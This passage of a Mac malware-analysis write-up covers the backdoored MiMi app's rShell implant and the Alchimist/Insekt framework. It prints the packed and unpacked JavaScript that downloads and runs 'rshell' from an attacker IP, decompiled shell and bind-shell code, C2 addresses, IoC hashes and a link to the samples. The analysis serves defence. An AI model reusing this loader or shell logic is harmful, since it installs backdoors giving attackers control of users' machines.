2=1(&#34;2&#34;);0 3=1(&#34;m&#34;).3;n.i(&#34;o&#34;,(e)=&gt;{j.k(e)});9 l(a,b,c){8 d=7.p(b);6(a).q(d).i(&#34;r&#34;,c)}s(2.t()==&#34;u&#34;){8 f=2.v()+&#34;/&#34;;8 g=&#34;5://w.y.z.A/&#34;;l(g+&#34;4&#34;,f+&#34;4&#34;,()=&gt;{j.k(&#34;B C&#34;);3(&#34;D +x &#34;+f+&#34;4&#34;);3(f+&#34;4&#34;)})}})();&#39;</span>,<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">40</span>,<span style="color:#e6db74">&#39;const|require|os|exec|rshell|http|request|fs|var|function||||||||https|on|console|log|downloadFile|child_process|process|uncaughtException|createWriteStream|pipe|close|if|platform|darwin|tmpdir|139||180|216|65|download|finish|chmod&#39;</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;|&#39;</span>),<span style="color:#ae81ff">0</span>,{}));<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span><span style="color:#f92672">=</span>{};<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">n</span>(<span style="color:#a6e22e">r</span>){<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">e</span>[<span style="color:#a6e22e">r</span>])<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">e</span>[<span style="color:#a6e22e">r</span>].<span style="color:#a6e22e">exports</span>;<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">o</span><span style="color:#f92672">=</span><span style="color:#a6e22e">e</span>[<span style="color:#a6e22e">r</span>]<span style="color:#f92672">=</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#a6e22e">r</span>,<span style="color:#a6e22e">l</span><span style="color:#f92672">:!</span><span style="color:#ae81ff">1</span>,<span style="color:#a6e22e">exports</span><span style="color:#f92672">:</span>{}};<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">t</span>[<span style="color:#a6e22e">r</span>].<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">exports</span>,<span style="color:#a6e22e">o</span>,<span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">exports</span>,<span style="color:#a6e22e">n</span>),<span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">l</span><span style="color:#f92672">=!</span><span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">exports</span>}<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">m</span><span style="color:#f92672">=</span><span style="color:#a6e22e">t</span>,<span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">e</span>,<span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">d</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>,<span style="color:#a6e22e">e</span>,<span style="color:#a6e22e">r</span>){<span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">o</span>(<span style="color:#a6e22e">t</span>,<span style="color:#a6e22e">e</span>)<span style="color:#f92672">||</span>Object.<span style="color:#a6e22e">defineProperty</span>(<span style="color:#a6e22e">t</span>,<span style="color:#a6e22e">e</span>,{<span style="color:#a6e22e">enumerable</span><span style="color:#f92672">:!</span><span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">get</span><span style="color:#f92672">:</span><span style="color:#a6e22e">r</span>})},<span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">r</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>){<span style="color:#e6db74">&#34;undefined&#34;</span><span style="color:#f92672">!==</span><span style="color:#66d9ef">typeof</span>...</span></span></code></pre></div>
<p>This JavaScript will be automatically executed when the (unsuspecting) user opens the <code>MiMi</code> application.</p>
<p>Below, is a relevant snippet of the unpacked JavaScript (unpacked by the TrendMicro researchers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">platform</span>() <span style="color:#a6e22e">as</span> <span style="color:#e6db74">&#34;darwin&#34;</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">tmpdir</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://139.180.216.65/&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>  <span style="color:#a6e22e">downloadFile</span>(<span style="color:#a6e22e">g</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;rshell&#34;</span>, <span style="color:#a6e22e">f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;rshell&#34;</span>, () =&gt; { <span style="color:#a6e22e">console</span>. <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;download finish&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>  <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;chmod +x &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;rshell&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>  <span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;rshell&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}</span></span></code></pre></div>
<p>The unpacked JavaScript is easy to understand, and performs the following actions:</p>
<ul>
<li>downloads a binary named <code>rshell</code> from <code>139.180.216.65</code></li>
<li>sets it executable (via <code>chmod</code>)</li>
<li>executes it
<br></li>
</ul>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> None </span>
</p>
<p>The <code>rshell</code> backdoor is not persistence. This is noted by the Sekoia researchers who state:</p>
<blockquote>
  "<i> ...[rshell] does not display a persistence mechanism.</i>" -ESET 
</blockquote>
<p>We can confirm this via static code analysis as well as by executing it on an analysis machine. The former did not reveal any code related to persistence, while when executed, the backdoor did not persist.</p>
<p>As <code>rshell</code> is a simple backdoor, it may simply be a 1<sup>st</sup>-stage tool, that on machines of interest could download and install a persistent (2<sup>nd</sup>-stage) tool. This approach is common in supply chain attacks, whereas the majority of victims may not be of interest to the attackers.</p>
<p>Also worth noting, as the backdoor will be (re)executed each time the user launches the infected <code>MiMi</code> application some level of (&ldquo;user-assisted&rdquo;) persistence is achieved.
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Backdoor
</span>
</p>
<blockquote>
  "<i>The rshell executable is a standard backdoor and implements functions typical of similar backdoors</i>" -TrendMicro 
</blockquote>
<p>The backdoor&rsquo;s capabilities include:</p>
<ul>
<li>Basic survey</li>
<li>Remote tasking</li>
</ul>
<p>The survey logic is implemented in an unnamed subroutine (at <code>0x000000010001754e</code>). Strings in this function include: &ldquo;login&rdquo;, &ldquo;hostname&rdquo;, &ldquo;lan&rdquo;, &ldquo;username&rdquo;, &ldquo;guid&rdquo;, and &ldquo;version&rdquo;. The function invokes helper functions to generate the survey data. For example, one such helper calls <code>uname</code> to get the host&rsquo;s name:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_1000041a5</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    rax <span style="color:#f92672">=</span> uname(<span style="color:#f92672">&amp;</span>var_510);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    ....
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>}</span></span></code></pre></div>
<p>&hellip;while another invokes <code>getuid</code> and <code>getpwuid</code> to get the victim&rsquo;s user name:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_100004172</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    rbx <span style="color:#f92672">=</span> arg0;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    rax <span style="color:#f92672">=</span> getuid();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    rax <span style="color:#f92672">=</span> getpwuid(rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>}</span></span></code></pre></div>
<p>This survey information is then transmitted to the attacker&rsquo;s command and control server (<code>103.79.77.178</code>):
<img src="../images/blog/blog_0x71/rsConnection.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(Attempted) Connection to the C C Server</center>
</p>
<p>The backdoor&rsquo;s main purpose is to execute commands, tasked to it by the command and control server. The commands are one of two types:</p>
<blockquote>
  "<i>[the] backdoor accepts two 'types' of commands: 'cmd' and 'file'. </i>" -Sekoia 
</blockquote>
<p>Both the TrendMicro <a href="https://www.trendmicro.com/en_us/research/22/h/irontiger-compromises-chat-app-Mimi-targets-windows-mac-linux-users.html">report</a> and Sekoia <a href="https://blog.sekoia.io/luckymouse-uses-a-backdoored-electron-app-to-target-macos/">report</a> identify three &ldquo;cmd&rdquo;-type commands which include:</p>
<ul>
<li>Start a new shell</li>
<li>Execute commands (via the shell)</li>
<li>Terminate the new shell.</li>
</ul>
<p>Here&rsquo;s backdoor&rsquo;s code, responsible for starting a new shell (initiated via a call to <code>forkpty</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sub_100023204</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2, <span style="color:#66d9ef">int</span> arg3) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    rbx <span style="color:#f92672">=</span> arg0;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    r14 <span style="color:#f92672">=</span> arg0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    rax <span style="color:#f92672">=</span> forkpty(r14, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)rbx <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xffffffff</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>                    r15 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)(rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>                    fcntl(r15, <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x4</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>                    fcntl(r15, <span style="color:#ae81ff">0x4</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>                    var_20 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa00050</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>                    ioctl(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)(rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>), <span style="color:#ae81ff">0xffffffff80087467</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>                    sub_1000232e0(rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>, r14);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>            }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>                    setsid();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>                    setenv(<span style="color:#e6db74">&#34;HISTFILE&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">0x1</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>                    setenv(<span style="color:#e6db74">&#34;TERM&#34;</span>, <span style="color:#e6db74">&#34;vt100&#34;</span>, <span style="color:#ae81ff">0x1</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>                    execl(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;bash&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>                    exit(<span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>            }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>}</span></span></code></pre></div>
<p>The other type of commands, are &ldquo;file&rdquo; commands, which allow a remote attacker to interact with the filesystem of the infected machine. These include expected commands such as:</p>
<ul>
<li>Directory/file enumeration</li>
<li>Download file</li>
<li>Upload file</li>
<li>Delete file</li>
</ul>
<p>Though not overly complex, <code>rShell</code>&rsquo;s capabilities will afford a remote attacker complete control over an infected system, as well as allowing a more complex/persistent 2<sup>nd</sup>-stage implant to be installed, if needed.
<br></p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>rShell</code> include the following (credit: TrendMicro):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>Rshell</code>: <br>
<code>3a9e72b3810b320fa6826a1273732fee7a8e2b2e5c0fd95b8c36bbab970e830a</code>
<code>8c3be245cbbe9206a5d146017c14b8f965ab7045268033d70811d5bcc4b796ec</code></li>
</ul>
</li>
<li>
<p>Network:</p>
<ul>
<li><code>139.180.216.65</code></li>
<li><code>45.142.214.193</code></li>
<li><code>104.168.211.246</code></li>
<li><code>80.92.206.158</code></li>
<li><code>45.77.250.141</code>
&hellip;</li>
</ul>
</li>
</ul>
<p>TrendMicro, has <a href="https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/h/iron-tiger-compromises-chat-application-mimi,-targets-windows,-mac,-and-linux-users/IOCs-IronTiger-compromises-chat-application-mimi-targets-windows-mac-linux-users.txt">published a file</a> solely containing such IoCs, which should also be consulted.</p>
<br>
<h3 id="-insekt">üëæ <strong><code>Insekt</code></strong></h3>
<div class="note">
<p>The Alchimist attack framework deploys cross-platform &ldquo;Insekt&rdquo; payloads including macOS variants.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/Insekt.zip"><code>Insekt</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In October, a researchers from Talos discovered a new attack framework named &ldquo;Alchimist&rdquo; capable of deploying cross-platform malware named &ldquo;Insekt&rdquo;</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">We recently discovered a new C2 framework called <a href="https://twitter.com/hashtag/Alchimist?src=hash&amp;ref_src=twsrc%5Etfw">#Alchimist</a> that&#39;s spreading the new <a href="https://twitter.com/hashtag/Insekt?src=hash&amp;ref_src=twsrc%5Etfw">#Insekt</a> trojan, targeting Windows, Mac and Linux machines Windows, Linux and Mac machines <a href="https://t.co/s8Njh7idFr">https://t.co/s8Njh7idFr</a> <a href="https://t.co/CRRYEjhlBN">pic.twitter.com/CRRYEjhlBN</a></p>&mdash; Cisco Talos Intelligence Group (@TalosSecurity) <a href="https://twitter.com/TalosSecurity/status/1580550920898650112?ref_src=twsrc%5Etfw">October 13, 2022</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://www.intego.com/mac-security-blog/malware-attack-framework-alchimist-designed-to-exploit-macs/">&ldquo;Malware Attack Framework &lsquo;Alchimist&rsquo; Designed to Exploit Macs&rdquo;</a></p>
</li>
<li>
<p><a href="https://blog.talosintelligence.com/alchimist-offensive-framework/">&ldquo;Alchimist: A new attack framework in Chinese for Mac, Linux and Windows&rdquo;</a>
<br></p>
</li>
</ul>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Unknown</span></p>
<p>What Talos discovered what an attack framework (and it&rsquo;s payloads). However, exactly how the attackers would intially gain access to victims Linux/Windows/Mac systems (in order to deploy the <code>Alchimist</code> payloads) is not known.</p>
<p>However based on capabilites of the attack framework, specifically the ability to &ldquo;generate PowerShell and wget code snippets&rdquo; could indicate that attackers could use standard (user-assisted) infection mechanisms such as malicous documents:</p>
<p><blockquote>
  "<i>"An attacker can embed these commands in a script (instrumented via a malicious entry point such as a maldoc, LNK, etc.) and deliver it to the victims by various means to gain an initial foothold, thereby downloading and implanting the Insekt RAT.</i>" -Talos 
</blockquote>
<br></p>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Unknown </span>
</p>
<p>Unfortunately a version of the <code>Insekt</code> RAT for macOS was not recovered. As such, it is not known how (or if) persistence is achieved.
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Backdoor/RAT
</span>
</p>
<p>As noted, a macOS version the <code>Insekt</code> RAT was not recovered nor seen in the wild. However, in their report, Talos noted that the Windows / Linux variant supported the following features &hellip;features that likely are implemented as well in the macOS variant:</p>
<ul>
<li>
<p>Sleep</p>
</li>
<li>
<p>Take screenshots</p>
</li>
<li>
<p>Upgrade backdoor</p>
</li>
<li>
<p>Retrieve file sizes</p>
</li>
<li>
<p>Determine OS information</p>
</li>
<li>
<p>Execute (shell?) commands</p>
</li>
<li>
<p>Execute (shell?) commands as another user</p>
</li>
</ul>
<p>The report also notes that (the Window/Linux variants):</p>
<blockquote>
  "<i>the implant consists of other capabilities [as well] such as shellcode execution, port and IP scanning, SSH key manipulation, proxying connections, etc.</i>" -Talos 
</blockquote>
<p>Also mentioned in the Talos report is a macOS tool (found in the open directory of the Alchimist server). This tool contains a (limited) privilege escalation vulnerability as well as:</p>
<blockquote>
  "<i>The Mach-O file discovered in the open directory is a 64-bit executable written in GoLang embedded with an exploit and a bind shell backdoor. The dropper contains an exploit for a privilege escalation vulnerability (CVE-2021-4034) in polkit's pkexec utility. However, this utility is not installed on MacOSX by default, meaning the elevation of privileges is not guaranteed. Along with the exploit, the dropper would bind a shell to a port providing the operators with a remote shell on the victim machine.</i>" -Talos 
</blockquote>
<p>The implementation of the privilege escalation vulnerability (<code>CVE-2021-4034</code>) comes from github: <a href="https://github.com/dzonerzy/poc-cve-2021-4034">poc-cve-2021-4034</a> and exploits a bug in Polkit.</p>
<p>As noted by Talos, Polkit is not installed by macOS by default (it&rsquo;s a 3rd-party open-source project). As it&rsquo;s rather unlikely that PolKit is installed macOS victim&rsquo;s machines, the impact of this tool is likely minimal. Still, let&rsquo;s explore it a bit.</p>
<p>When run, the tool drops a binary named <code>payload.so</code>. Using the <code>file</code> tool one can see it is a dynamic library (&lsquo;dylib&rsquo;):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% file payload.so 
payload.so: Mach-O 64-bit dynamically linked shared library x86_64
</pre>
</div>
<p>The main logic for the bind-shell appears in the function named <code>main.gconv_init</code> (found at <code>0x00000000000fd300</code>). The (annotated) decompilation of this function reveals GO-code, that:</p>
<ul>
<li>reads an integer value from an environment variable <code>NOTTY_PORT</code></li>
<li>invokes the <code>net.Listen</code> function to listen on this port (interface: <code>0.0.0.0</code>)</li>
<li>handles the connection (via a call to a function named <code>main.handle_connection</code>)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">//get port via &#39;NOTTY_PORT&#39;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Getenv</span>(<span style="color:#f92672">...</span>, <span style="color:#a6e22e">NOTTY_PORT</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#f92672">...</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">ParseInt</span>(<span style="color:#f92672">...</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#75715e">//create: &#34;0.0.0.0:&lt;port&gt;&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#75715e"></span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#f92672">...</span>, <span style="color:#ae81ff">0.0.0.0</span>, <span style="color:#f92672">...</span>, <span style="color:#a6e22e">port</span>, <span style="color:#f92672">...</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#75715e">//listen
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e"></span><span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#75715e">//handle connection
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#75715e"></span><span style="color:#a6e22e">main</span>.<span style="color:#a6e22e">handle_connection</span>(<span style="color:#f92672">...</span>);</span></span></code></pre></div>
<p>When a remote attacker connects, a function named <code>main.handle_connection</code> is invoked (as shown in the above decompilation).</p>
<p>This executes the attackers command either via:</p>
<ul>
<li><code>os/exec.Command </code></li>
</ul>
<p>or</p>
<ul>
<li><code>_os/exec.(*Cmd).Start</code> and <code> _os/exec.(*Cmd).Wait</code></li>
</ul>
<p>The tool also contains logic to directly execute a command if the <code>CMD</code> environment variable is set. This will be executed via <code>syscall.Exec</code> by means of <code>/bin/sh</code> (<code>-c</code>):</p>
<pre tabindex="0"><code>0x00000000000fecec                        db  0x2d ; &#39;-&#39;
0x00000000000feced                        db  0x63 ; &#39;c&#39;

0x00000000000ff3ab                        db  0x2f ; &#39;/&#39;
